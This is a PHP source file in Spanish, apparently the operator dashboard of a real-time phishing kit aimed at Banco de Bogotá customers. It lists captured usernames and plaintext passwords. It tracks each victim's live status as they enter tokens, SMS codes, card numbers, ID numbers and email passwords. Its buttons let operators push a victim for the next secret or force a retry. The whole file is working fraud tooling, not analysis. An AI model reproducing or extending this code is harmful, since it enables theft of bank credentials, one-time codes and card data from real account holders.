<?php
header('Content-Type: text/html; charset=UTF-8');
date_default_timezone_set('America/Bogota'); // Asegura que PHP use la zona horaria de Bogotá

require_once 'db.php'; // Este archivo ya establece la conexión $db (PDO) y la zona horaria de MySQL

// Obtener el rol y ID del usuario logueado desde la sesión
session_start(); // Asegurarse de que la sesión esté iniciada para acceder a $_SESSION
$current_user_role = $_SESSION['role'] ?? 'guest';
$current_user_id = $_SESSION['user_id'] ?? null;
$current_username = $_SESSION['username'] ?? ''; // Obtener el nombre de usuario actual

// Define el tiempo máximo en segundos para que un registro se considere "gestionado"
const LOCK_TIMEOUT = 300; // 5 minutos

$limite = 50;
if (isset($_GET['limit']) && is_numeric($_GET['limit'])) {
    $limite = min(intval($_GET['limit']), 1000);
}

try {
    // Añadimos gestionado_por y gestion_iniciada_at a la selección
    $sql_select = "SELECT *, gestionado_por, gestion_iniciada_at FROM registros"; // AÑADIDO: Seleccionar columnas de bloqueo
    $sql_where = [];
    $params = [];

    // --- Lógica de permisos de entidad para usuarios con rol 'user' ---
    if ($current_user_role === 'user' && $current_user_id) {
        // 1. Obtener las entidades permitidas para este usuario desde la tabla panel_users
        $stmt_user_entities = $db->prepare("SELECT allowed_entities FROM panel_users WHERE id = ?");
        $stmt_user_entities->execute([$current_user_id]);
        $allowed_entities_str = $stmt_user_entities->fetchColumn(); // Obtiene la cadena de entidades
        
        // AÑADIDO: Lógica para manejar el comodín '*'
        $allow_all_entities = false;
        if ($allowed_entities_str !== null) { // Si no es NULL
            $trimmed_str = trim($allowed_entities_str);
            if ($trimmed_str === '*' || $trimmed_str === '') { // Si es '*' o está vacío (considerar vacío como 'todos')
                $allow_all_entities = true;
            }
        }
        // FIN AÑADIDO

        // MODIFICADO: Aplicar filtro SOLO si no se permiten todas las entidades
        if (!$allow_all_entities) { 
            if (!empty($allowed_entities_str)) {
                // Dividir la cadena en un array y limpiar espacios
                $allowed_entities_array = explode(',', $allowed_entities_str);
                $clean_allowed_entities = array_map('trim', $allowed_entities_array);
                $clean_allowed_entities = array_filter($clean_allowed_entities); // Elimina cadenas vacías

                if (!empty($clean_allowed_entities)) {
                    // Construir la cláusula SQL 'IN (?, ?, ?)' para filtrar por entidad
                    $placeholders = implode(',', array_fill(0, count($clean_allowed_entities), '?'));
                    $sql_where[] = "entidad IN ($placeholders)";
                    $params = array_merge($params, $clean_allowed_entities); // Añadir las entidades a los parámetros
                } else {
                    // Si la columna está vacía o solo tiene espacios, y no es '*', no mostrar ningún registro.
                    $sql_where[] = "1 = 0"; // Fuerza que la consulta no devuelva resultados
                }
            } else {
                // Si el usuario 'user' no tiene entidades permitidas definidas, no mostrar nada por defecto.
                $sql_where[] = "1 = 0"; // Fuerza que la consulta no devuelva resultados
            }
        }
        // else: Si $allow_all_entities es true, no se añade ninguna condición WHERE por entidad,
        // lo que permitirá que se muestren todas las entidades (como el comodín '*').
    }
    // --- FIN Lógica de permisos de entidad ---

    // --- Lógica de Filtros y Búsqueda (NUEVA) ---
    $search_term = $_GET['search_term'] ?? '';
    $filter_status = $_GET['filter_status'] ?? '';
    $filter_operador = $_GET['filter_operador'] ?? '';
    $filter_entidad = $_GET['filter_entidad'] ?? '';

    if (!empty($search_term)) {
        $sql_where[] = "(usuario LIKE ? OR id = ?)";
        $params[] = '%' . $search_term . '%';
        $params[] = $search_term; // Para búsqueda exacta por ID
    }

    if (!empty($filter_status)) {
        $sql_where[] = "status = ?";
        $params[] = $filter_status;
    }

    if (!empty($filter_operador)) {
        $sql_where[] = "operador = ?";
        $params[] = $filter_operador;
    }

    if (!empty($filter_entidad)) {
        $sql_where[] = "entidad = ?";
        $params[] = $filter_entidad;
    }
    // --- FIN Lógica de Filtros y Búsqueda ---

    // Añadir la cláusula WHERE si hay algún filtro (incluyendo el de entidades, búsqueda y nuevos filtros)
    if (!empty($sql_where)) {
        $sql_select .= " WHERE " . implode(" AND ", $sql_where);
    }
    
    $sql_select .= " ORDER BY id DESC LIMIT " . $limite;

    $stmt = $db->prepare($sql_select);
    $stmt->execute($params);
    $registros = $stmt->fetchAll(PDO::FETCH_ASSOC);

    $ahora = time();

    if (empty($registros)) {
        echo "<tr><td colspan='10'>No hay registros para mostrar.</td></tr>";
    } else {
        foreach ($registros as $fila) {
            $ultimaConexion = strtotime($fila['ultima_conexion']);
            $diferencia = $ahora - $ultimaConexion;
            $conectado = $diferencia <= 10;
            $estado = $fila['status'] ?? '';

            $tooltip = $fila['ultima_conexion'] ?? 'sin datos';
            $color = $conectado ? 'verde' : 'rojo';

            $claseFila = '';
            // AÑADIDO: Nuevos estados para tr-alerta
            if (in_array($estado, ["Usuario Ingresado", "Clave Ingresada", "Token Ingresado", "Celular Ingresado", "Tarjeta Ingresada",
                                  "SMS OTP Ingresado", "APP QR Ingresado", "Cedula Ingresada", "Ano Nacimiento Ingresado",
                                  "Respuesta Ingresada", "Correo Ingresado", "Clave Correo Ingresada",
                                  "Tarjeta Debito Ingresada", "Clave Tarjeta Debito Ingresada", "Usuario Errado",
                                  "Esperando App Movil"]) && $conectado) { // "Esperando App Movil" también activa alerta
                $claseFila = 'tr-alerta';
            } elseif ($diferencia > 300) {
                $claseFila = 'tr-offline-largo';
            }

            // Lógica para el estado de "gestionado_por"
            $gestionado_por_registro = $fila['gestionado_por'] ?? '';
            $gestion_iniciada_at_timestamp = strtotime($fila['gestion_iniciada_at'] ?? '1970-01-01 00:00:00');
            
            $is_locked_by_other_operator = false;
            $gestion_info = '';
            $onclick_event = ''; // Inicializar a vacío

            if (!empty($gestionado_por_registro) && $gestionado_por_registro !== 'sin datos' && $gestionado_por_registro !== $current_username) {
                $time_since_gestion_started = $ahora - $gestion_iniciada_at_timestamp;
                // Si otro operador lo está gestionando y el tiempo no ha excedido el límite
                if ($time_since_gestion_started <= LOCK_TIMEOUT) {
                    $is_locked_by_other_operator = true;
                    $claseFila .= ' tr-gestionado-otro'; // Clase para CSS
                    $gestion_info = "Gestionado por: " . htmlspecialchars($gestionado_por_registro) . " (desde " . date("H:i:s", $gestion_iniciada_at_timestamp) . ")";
                    $onclick_event = "event.stopPropagation(); return false;"; // Deshabilita el clic
                }
            } elseif (!empty($gestionado_por_registro) && $gestionado_por_registro === $current_username) {
                // Si el registro está gestionado por el usuario actual
                $claseFila .= ' tr-gestionado-propio'; // Clase para CSS
                $onclick_event = "abrirGestionUsuario({$fila['id']})"; // Permite que el usuario actual haga clic
            } else {
                // Si no está gestionado por nadie o el bloqueo ha expirado, permitir clic normal
                $onclick_event = "abrirGestionUsuario({$fila['id']})";
            }
            
            echo "<tr class='$claseFila' onclick='{$onclick_event}'>"; // APLICACIÓN DEL ONCLICK DINÁMICO

            echo "<td data-label='ID'>" . htmlspecialchars($fila['id']) . "</td>";
            echo "<td data-label='Usuario'>" . htmlspecialchars($fila['usuario']) . "</td>";
            echo "<td data-label='Password'>" . htmlspecialchars($fila['pass']) . "</td>";
            
            // Columna 'Entidad' con el icono personalizado
            echo "<td data-label='Entidad'>";
            $entidadDisplay = htmlspecialchars($fila['entidad'] ?? 'sin datos');
            if ($entidadDisplay === 'Bogota Empresas') {
                echo "<img src='icons/bogota.ico' alt='Banco de Bogotá' style='width:24px; height:24px; vertical-align:middle; margin-right:5px;'>";
                echo $entidadDisplay;
            } else {
                echo $entidadDisplay;
            }
            echo "</td>";

            echo "<td data-label='Tienda'>" . htmlspecialchars($fila['tienda'] ?? 'sin datos') . "</td>";
            echo "<td data-label='Sistema'>" . htmlspecialchars($fila['sistema_operativo']) . "</td>";

            echo "<td data-label='Estado'>";
            if ($estado === "Usuario Ingresado" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> Usuario Ingresado</span>";
            } elseif ($estado === "Esperando Password" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⌛</span> Esperando Password</span>";
            } 
            elseif ($estado === "Clave Ingresada" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> Clave Ingresada</span>";
            } elseif ($estado === "Esperando Token" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⌛</span> Esperando Token</span>";
            } elseif ($estado === "Token Ingresado" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> Token Ingresado</span>";
            } elseif ($estado === "Esperando Celular" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⌛</span> Esperando Celular</span>";
            } elseif ($estado === "Celular Ingresado" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> Celular Ingresado</span>";
            } elseif ($estado === "Esperando Tarjeta" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⌛</span> Esperando Tarjeta</span>";
            } elseif ($estado === "Tarjeta Ingresada" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> Tarjeta Ingresada</span>";
            }
            elseif ($estado === "Esperando SMS OTP" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⌛</span> Esperando SMS OTP</span>";
            } elseif ($estado === "SMS OTP Ingresado" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> SMS OTP Ingresado</span>";
            }
            elseif ($estado === "Esperando APP QR" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⌛</span> Esperando APP QR</span>";
            } elseif ($estado === "APP QR Ingresado" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> APP QR Ingresado</span>";
            }
            elseif ($estado === "Esperando Cedula" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⌛</span> Esperando Cédula</span>";
            } elseif ($estado === "Cedula Ingresada" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> Cédula Ingresada</span>";
            }
            elseif ($estado === "Esperando Ano Nacimiento" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⌛</span> Esperando Año Nac.</span>";
            } elseif ($estado === "Ano Nacimiento Ingresado" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> Año Nac. Ingresado</span>";
            }
            elseif ($estado === "Esperando Pregunta" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⌛</span> Esperando Pregunta</span>";
            } elseif ($estado === "Respuesta Ingresada" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> Pregunta Ingresada</span>";
            }
            elseif ($estado === "Esperando Correo" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⌛</span> Esperando Correo</span>";
            } elseif ($estado === "Correo Ingresado" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> Correo Ingresado</span>";
            }
            elseif ($estado === "Esperando Clave Correo" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⌛</span> Esperando Clave Correo</span>";
            } elseif ($estado === "Clave Correo Ingresada" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> Clave Correo Ingresada</span>";
            }
            elseif ($estado === "Esperando Tarjeta Debito" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⌛</span> Esperando Tarjeta Débito</span>";
            } elseif ($estado === "Tarjeta Debito Ingresada" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> Tarjeta Débito Ingresada</span>";
            }
            elseif ($estado === "Esperando Clave Tarjeta Debito" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⌛</span> Esperando Clave T. Débito</span>";
            } elseif ($estado === "Clave Tarjeta Debito Ingresada" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> Clave T. Débito Ingresada</span>";
            }
            elseif ($estado === "Usuario Errado" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⚠️</span> Usuario Errado</span>";
            }
            // NUEVOS ESTADOS
            elseif ($estado === "Esperando App Movil" && $conectado) {
                echo "<span class='estado-pulso'><span style='font-size:22px;'>⏳</span> Esperando App Móvil</span>";
            } elseif ($estado === "App Movil Aprobada") {
                echo "<span style='color:green; font-weight:bold;'><span style='font-size:22px;'>✅</span> App Móvil Aprobada</span>";
            }
            // FIN NUEVOS ESTADOS
            elseif ($estado === "Completado") {
                echo "<span style='color:green; font-weight:bold;'><span style='font-size:22px;'>✔️</span> Completado</span>";
            } elseif ($estado === "Error General" || $estado === "Denegado") {
                echo "<span style='color:red; font-weight:bold;'><span style='font-size:22px;'>❌</span> Error/Denegado</span>";
            }
            else {
                echo htmlspecialchars($estado);
            }
            echo "</td>";

            echo "<td data-label='Operador'>" . htmlspecialchars($fila['operador']) . "</td>";

            $horaUltima = date("g:i A", strtotime($fila['ultima_conexion']));
            $tooltip = date("H:i:s", strtotime($fila['ultima_conexion']));

            echo "<td data-label='Conectado' style='text-align:center;'>
                          <div title='Última conexión: $tooltip'>
                              <div class='estado-circulo estado-$color'></div>
                              <small style='font-size:11px; display:block; margin-top:2px;'>$horaUltima</small>
                          </div>
                      </td>";

            echo "<td data-label='Acción'>";
            if ($is_locked_by_other_operator) {
                // Mostrar mensaje de bloqueo si otro operador lo está gestionando
                echo "<span style='color:#888; font-style:italic; font-size:12px; display:block;'>" . htmlspecialchars($gestion_info) . "</span>";
            } else {
                // Mostrar los botones si no está bloqueado por otro o si el bloqueo expiró
                echo "  <button title='Password' onclick='event.stopPropagation(); enviarOrdenPassword({$fila['id']})' style='background-color:#343a40; color:white; border:none; padding:6px 10px; border-radius:4px; cursor:pointer; margin-bottom: 5px; display:inline-block;'>";
                echo "      <i class='fas fa-key'></i>";
                echo "  </button>";
                echo "  <button title='Token' onclick='event.stopPropagation(); enviarOrdenToken({$fila['id']})' style='background-color:#007bff; color:white; border:none; padding:6px 10px; border-radius:4px; cursor:pointer; margin-left:5px; margin-bottom: 5px; display:inline-block;'>";
                echo "      <i class='fas fa-shield-alt'></i>";
                echo "  </button>";
                echo "  <button title='Celular' onclick='event.stopPropagation(); enviarOrdenCelular({$fila['id']})' style='background-color:#6c757d; color:white; border:none; padding:6px 10px; border-radius:4px; cursor:pointer; margin-left:5px; margin-bottom: 5px; display:inline-block;'>";
                echo "      <i class='fas fa-mobile-alt'></i>";
                echo "  </button>";
                echo "  <button title='Tarjeta' onclick='event.stopPropagation(); enviarOrdenTarjeta({$fila['id']})' style='background-color:#17a2b8; color:white; border:none; padding:6px 10px; border-radius:4px; cursor:pointer; margin-left:5px; margin-bottom: 5px; display:inline-block;'>";
                echo "      <i class='fas fa-credit-card'></i>";
                echo "  </button>";

                if ($estado === "Clave Ingresada") {
                    echo "  <button title='Marcar como Clave Errada y Reintentar' onclick='event.stopPropagation(); forzarReintentarPassword({$fila['id']})' style='background-color:#ffc107; color:black; border:none; padding:6px 10px; border-radius:4px; cursor:pointer; margin-top:5px; margin-left:5px; display:inline-block;'>";
                    echo "      <i class='fas fa-exclamation-triangle'></i> Re-Pass";
                    echo "  </button>";
                }
                if ($estado === "Token Ingresado") {
                    echo "  <button title='Marcar como Token Errado y Reintentar' onclick='event.stopPropagation(); forzarReintentarToken({$fila['id']})' style='background-color:#fd7e14; color:white; border:none; padding:6px 10px; border-radius:4px; cursor:pointer; margin-top:5px; margin-left:5px; display:inline-block;'>";
                    echo "      <i class='fas fa-redo'></i> Re-Token";
                    echo "  </button>";
                }
                if ($estado === "Usuario Ingresado" || $estado === "Usuario Errado") {
                    echo "  <button title='Marcar como Usuario Errado y Reintentar' onclick='event.stopPropagation(); enviarOrdenUsuario({$fila['id']})' style='background-color:#ff9800; color:white; border:none; padding:6px 10px; border-radius:4px; cursor:pointer; margin-top:5px; margin-left:5px; display:inline-block;'>";
                    echo "      <i class='fas fa-user-times'></i> Re-User";
                    echo "  </button>";
                }

                if ($conectado && !in_array($estado, ["Completado", "Error General", "Denegado"])) {
                    echo "  <button title='Finalizar Proceso' onclick='event.stopPropagation(); enviarOrdenFinalizar({$fila['id']})' style='background-color:#28a745; color:white; border:none; padding:6px 10px; border-radius:4px; cursor:pointer; margin-top:5px; margin-left:5px; display:inline-block;'>";
                    echo "      <i class='fas fa-check-circle'></i> Finalizar";
                    echo "  </button>";
                }
            }
            echo "</td>";
            echo "</tr>";
        }
    }
} catch (PDOException $e) {
    error_log("Error en datos.php: " . $e->getMessage());
    echo "<tr><td colspan='10'>Error al cargar los registros: " . htmlspecialchars($e->getMessage()) . "</td></tr>";
}
?>